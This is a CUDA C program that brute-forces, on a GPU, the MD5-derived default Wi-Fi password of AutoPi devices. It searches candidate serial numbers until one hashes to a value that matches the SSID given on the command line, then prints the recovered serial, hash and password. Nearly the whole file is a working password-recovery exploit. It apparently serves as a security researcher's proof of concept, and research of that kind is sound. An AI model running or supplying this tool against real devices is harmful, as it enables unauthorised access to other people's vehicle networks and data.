/* MD5
Original algorithm by RSA Data Security, Inc
Adapted for NVIDIA CUDA by Matthew McClaskey
 
Copyright (C) 1991-2, RSA Data Security, Inc. Created 1991. All
rights reserved.
 
License to copy and use this software is granted provided that it
is identified as the "RSA Data Security, Inc. MD5 Message-Digest
Algorithm" in all material mentioning or referencing this software
or this function.
 
License is also granted to make and use derivative works provided
that such works are identified as "derived from the RSA Data
Security, Inc. MD5 Message-Digest Algorithm" in all material
mentioning or referencing the derived work.
 
RSA Data Security, Inc. makes no representations concerning either
the merchantability of this software or the suitability of this
software for any particular purpose. It is provided "as is"
without express or implied warranty of any kind.
 
These notices must be retained in any copies of any part of this
documentation and/or software.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <math.h>
 
const unsigned int S11 = 7;
const unsigned int S12 = 12;
const unsigned int S13 = 17;
const unsigned int S14 = 22;
const unsigned int S21 = 5;
const unsigned int S22 = 9;
const unsigned int S23 = 14;
const unsigned int S24 = 20;
const unsigned int S31 = 4;
const unsigned int S32 = 11;
const unsigned int S33 = 16;
const unsigned int S34 = 23;
const unsigned int S41 = 6;
const unsigned int S42 = 10;
const unsigned int S43 = 15;
const unsigned int S44 = 21;

#define TRUE 1
#define FALSE 0

__device__ const unsigned int charLen = 8;
__device__ const unsigned int pwdbitlen = 136; // number of bits in plain text
__device__ const unsigned char hexLookup[] = "0123456789abcdef";
 
/* F, G, H and I are basic MD5 functions */
__device__ inline unsigned int F(unsigned int x, unsigned int y, unsigned int z) { return (((x) & (y)) | ((~x) & (z))); }
__device__ inline unsigned int G(unsigned int x, unsigned int y, unsigned int z) { return (((x) & (z)) | ((y) & (~z))); }
__device__ inline unsigned int H(unsigned int x, unsigned int y, unsigned int z) { return ((x) ^ (y) ^ (z)); }
__device__ inline unsigned int I(unsigned int x, unsigned int y, unsigned int z) { return ((y) ^ ((x) | (~z))); }
 
/* ROTATE_LEFT rotates x left n bits */
#define ROTATE_LEFT(x, n) (((x) << (n)) | ((x) >> (32-(n))))
 
/* Rotation is separate from addition to prevent recomputation */
__device__ inline void FF(unsigned int &a, unsigned int b, unsigned int c, unsigned int d, unsigned int x, unsigned int s, unsigned int ac)
{
	a = ROTATE_LEFT(a + F(b, c, d) + x + ac, s) + b;
}
 
__device__ inline void GG(unsigned int &a, unsigned int b, unsigned int c, unsigned int d, unsigned int x, unsigned int s, unsigned int ac)
{
	a = ROTATE_LEFT(a + G(b, c, d) + x + ac, s) + b;
}
 
__device__ inline void HH(unsigned int &a, unsigned int b, unsigned int c, unsigned int d, unsigned int x, unsigned int s, unsigned int ac)
{
	a = ROTATE_LEFT(a + H(b ,c ,d) + x + ac, s) + b;
}
 
__device__ inline void II(unsigned int &a, unsigned int b, unsigned int c, unsigned int d, unsigned int x, unsigned int s, unsigned int ac)
{
	a = ROTATE_LEFT(a + I(b, c, d) + x + ac, s) + b;
}

__device__ void setSerial(char output[], unsigned int input[]) {
	for (unsigned int i = 0, j = 0; j < 16; j+=4, i++) {
		for (unsigned int k = 0; k < 4; k++) {
			output[j + k] = (unsigned char) ((input[i] >> 8*k) & 0xff);
		}
	}
}

__device__ void setHash(char output[], unsigned int input[]) {
	for (unsigned int i = 0, j = 0; j < 32; j+=8, i++) {
		for (unsigned int k = 0; k < 8; k+=2) {
			output[j + k + 1] = hexLookup[((input[i] >> 4*k+0) & 0xf)];
			output[j + k + 0] = hexLookup[((input[i] >> 4*k+4) & 0xf)];
		}
	}
}
 
__global__ void findMatch(unsigned int* ssid, unsigned int* found, char* serialResult, char* hashResult) {  
	unsigned int a, b, c, d;
	unsigned int serial[5];

	for (int i = 0; i < sizeof(serial)/sizeof(serial[0]); i++) {
		serial[i] = 0;
	}

	/*
		Set up serial number in format: "00000000xyzrsijk" + "\n"
		(md5 uses little endian => "00000000rzyxkjis")
		
		Where chars...:
		x, y & z are taken from the blockId.
		r & s are taken from the threadId.
		i, j & k are produced in the three nested loops underneath.
		
		The serial is stored in a int array:
		serial[0] == '0000'
		serial[1] == '0000'
		serial[2] == 'xyzr'
		serial[3] == 'sijk'
		serial[4] == '00d\n'	// d = 1 bit delimiter used by the md5 algorithm
	*/

	for (int i = 0; i < 4; i++) {
		serial[0] += hexLookup[0] << charLen*i;
	}
	serial[1] = serial[0];
	
	serial[2] += hexLookup[(blockIdx.x & 0xf00) >> 8] << charLen*3;		// serial[2] = 'x   '
	serial[2] += hexLookup[(blockIdx.x & 0x0f0) >> 4] << charLen*2;		// serial[2] = 'xy  '
	serial[2] += hexLookup[(blockIdx.x & 0x00f)]      << charLen*1;		// serial[2] = 'xyz '
	serial[2] += hexLookup[(threadIdx.x & 0xf0) >> 4] << charLen*0;		// serial[2] = 'xyzr'

	serial[3] += hexLookup[(threadIdx.x & 0x0f)]      << charLen*3;		// serial[3] = 't   '

	serial[4] += 10  << charLen*0;    					// serial[4] = '   \n'
	serial[4] += 128 << charLen*1;    					// serial[4] = '  d\n'

	// ASCII 0(48) -> 9(57) & a(97) -> f(102)               
	for (unsigned int i = 48; i <= 102; i++) {
		serial[3] &= ~(0xff << charLen*2);           // erase last loops value    
		serial[3] += (i << charLen*2);               // serial[3] = 'ti  '

		for (unsigned int j = 48; j <= 102; j++) {
			serial[3] &= ~(0xff << charLen*1);       // erase last loops value   
			serial[3] += (j << charLen*1);           // serial[3] = 'tij '

			for (unsigned int k = 48; k <= 102; k++) {
				serial[3] &= ~(0xff << charLen*0);   // erase last loops value   
				serial[3] += (k << charLen*0);       // serial[3] = 'tijk'

				//load magic numbers
				a = 0x67452301;
				b = 0xefcdab89;
				c = 0x98badcfe;
				d = 0x10325476;

				// Round 1
				FF ( a, b, c, d, serial[0], S11, 0xd76aa478); // 1
				FF ( d, a, b, c, serial[1], S12, 0xe8c7b756); // 2
				FF ( c, d, a, b, serial[2], S13,  0x242070db); // 3
				FF ( b, c, d, a, serial[3], S14, 0xc1bdceee); // 4
				FF ( a, b, c, d, serial[4], S11, 0xf57c0faf); // 5
				FF ( d, a, b, c, 0, S12, 0x4787c62a); // 6
				FF ( c, d, a, b, 0, S13, 0xa8304613); // 7
				FF ( b, c, d, a, 0, S14, 0xfd469501); // 8
				FF ( a, b, c, d, 0, S11, 0x698098d8); // 9
				FF ( d, a, b, c, 0, S12, 0x8b44f7af); // 10
				FF ( c, d, a, b, 0, S13, 0xffff5bb1); // 11
				FF ( b, c, d, a, 0, S14, 0x895cd7be); // 12
				FF ( a, b, c, d, 0, S11, 0x6b901122); // 13
				FF ( d, a, b, c, 0, S12, 0xfd987193); // 14
				FF ( c, d, a, b, pwdbitlen, S13, 0xa679438e); // 15
				FF ( b, c, d, a, 0, S14, 0x49b40821); // 

				// Round 2
				GG (a, b, c, d, serial[1], S21, 0xf61e2562); // 17
				GG (d, a, b, c, 0, S22, 0xc040b340); // 18
				GG (c, d, a, b, 0, S23, 0x265e5a51); // 19
				GG (b, c, d, a, serial[0], S24, 0xe9b6c7aa); // 20
				GG (a, b, c, d, 0, S21, 0xd62f105d); // 21
				GG (d, a, b, c, 0, S22,  0x2441453); // 22
				GG (c, d, a, b, 0, S23, 0xd8a1e681); // 23
				GG (b, c, d, a, serial[4], S24, 0xe7d3fbc8); // 24
				GG (a, b, c, d, 0, S21, 0x21e1cde6); // 25
				GG (d, a, b, c, pwdbitlen, S22, 0xc33707d6); // 26
				GG (c, d, a, b, serial[3], S23, 0xf4d50d87); // 27
				GG (b, c, d, a, 0, S24, 0x455a14ed); // 28
				GG (a, b, c, d, 0, S21, 0xa9e3e905); // 29
				GG (d, a, b, c, serial[2], S22, 0xfcefa3f8); // 30
				GG (c, d, a, b, 0, S23, 0x676f02d9); // 31
				GG (b, c, d, a, 0, S24, 0x8d2a4c8a); // 32

				// Round 3
				HH (a, b, c, d, 0, S31, 0xfffa3942); // 33
				HH (d, a, b, c, 0, S32, 0x8771f681); // 34
				HH (c, d, a, b, 0, S33, 0x6d9d6122); // 35
				HH (b, c, d, a, pwdbitlen, S34, 0xfde5380c); // 36
				HH (a, b, c, d, serial[1], S31, 0xa4beea44); // 37
				HH (d, a, b, c, serial[4], S32, 0x4bdecfa9); // 38
				HH (c, d, a, b, 0, S33, 0xf6bb4b60); // 39
				HH (b, c, d, a, 0, S34, 0xbebfbc70); // 40
				HH (a, b, c, d, 0, S31, 0x289b7ec6); // 41
				HH (d, a, b, c, serial[0], S32, 0xeaa127fa); // 42
				HH (c, d, a, b, serial[3], S33, 0xd4ef3085); // 43
				HH (b, c, d, a, 0, S34,  0x4881d05); // 44
				HH (a, b, c, d, 0, S31, 0xd9d4d039); // 45
				HH (d, a, b, c, 0, S32, 0xe6db99e5); // 46
				HH (c, d, a, b, 0, S33, 0x1fa27cf8); // 47
				HH (b, c, d, a, serial[2], S34, 0xc4ac5665); // 48

				// Round 4
				II (a, b, c, d, serial[0], S41, 0xf4292244); // 49
				II (d, a, b, c, 0, S42, 0x432aff97); // 50
				II (c, d, a, b, pwdbitlen, S43, 0xab9423a7); // 51
				II (b, c, d, a, 0, S44, 0xfc93a039); // 52
				II (a, b, c, d, 0, S41, 0x655b59c3); // 53
				II (d, a, b, c, serial[3], S42, 0x8f0ccc92); // 54
				II (c, d, a, b, 0, S43, 0xffeff47d); // 55
				II (b, c, d, a, serial[1], S44, 0x85845dd1); // 56
				II (a, b, c, d, 0, S41, 0x6fa87e4f); // 57
				II (d, a, b, c, 0, S42, 0xfe2ce6e0); // 58
				II (c, d, a, b, 0, S43, 0xa3014314); // 59
				II (b, c, d, a, 0, S44, 0x4e0811a1); // 60
				II (a, b, c, d, serial[4], S41, 0xf7537e82); // 61
				II (d, a, b, c, 0, S42, 0xbd3af235); // 62
				II (c, d, a, b, serial[2], S43, 0x2ad7d2bb); // 63
				II (b, c, d, a, 0, S44, 0xeb86d391); // 64

				a += 0x67452301;
				b += 0xefcdab89;
				c += 0x98badcfe;
				d += 0x10325476;

				if (((c >> charLen*2) & 0xffff) == ((ssid[0] >> charLen*2) & 0xffff) && d == ssid[1]) {
					unsigned int hash[] = {a, b, c, d};

					*found = TRUE;
					setSerial(serialResult, serial);
					setHash(hashResult, hash);
					
					return;
				}

				if (k == 57)
					k = 96; // values will be incremented to 97 at the end of their loops
			}
			if (j == 57)
				j = 96;
		}
		if (i == 57)
			i = 96;
	}
}

void usage(char *argv[]) {
	printf("%-7s %s %s\n", "Usage:", argv[0], "<12 hex SSID>");
	exit(0);
}

// Converts the 12 hex char ssid input to arrays of integers in
// little endian which is used by the md5 algorithm.
void ssidToInts(unsigned int result[], char input[]) {
	// Pad with zeros to align with multiple of 8.
	// Will be masked away when doing compares.
	char ssid[17];
	snprintf(ssid, sizeof(ssid)/sizeof(ssid[0]), "%s%s", "0000", input);

	char tmpResult[9];
	tmpResult[8] = 0;
	for (int i = 0; i < 16; i+=8) {
		for (int j = 0; j < 8; j+=2) {
			tmpResult[(j + 1) % 8] = ssid[i + (8 - 1 - j - 0)];
			tmpResult[(j + 0) % 8] = ssid[i + (8 - 1 - j - 1)];
		}
		
		result[(i + 1) / 8] = strtoul(tmpResult, NULL, 16);
	}
}

int main(int argc, char *argv[]) {
	if (argc != 2 || strlen(argv[1]) != 12) {
		usage(argv);
	}
	
	// declare
	unsigned int *found, *ssid;
	char *serialResult, *hashResult;
	const int SERIAL_LENGTH = 16 + 1, HASH_LENGTH = 32 + 1;

	// malloc
	cudaMallocManaged((void**)&found, sizeof(int));
	cudaMallocManaged((void**)&ssid, 2 * sizeof(int));
	cudaMallocManaged((void**)&serialResult, SERIAL_LENGTH * sizeof(char));
	cudaMallocManaged((void**)&hashResult, HASH_LENGTH * sizeof(char));
	
	// init
	*found = FALSE;
	ssidToInts(ssid, argv[1]);
	serialResult[SERIAL_LENGTH - 1] = 0;
	hashResult[HASH_LENGTH - 1] = 0;

	findMatch<<<4096, 256>>>(ssid, found, serialResult, hashResult);
	cudaDeviceSynchronize();
	
	if (*found) {
		char password[13];
		strncpy(password, hashResult, 12);
		password[12] = 0;

		printf("%-10s %s\n", "Serial:", serialResult);
		printf("%-10s %s\n", "Hash:", hashResult);
		printf("%-10s AutoPi-%s\n", "SSID:", argv[1]);
		printf("%-10s %s\n", "Password:", password);
	} else {
		printf("No match found for SSID %s\n", argv[1]);
	}

	cudaFree(found);
	cudaFree(ssid);
	cudaFree(serialResult);
	cudaFree(hashResult);

	return 0;
}
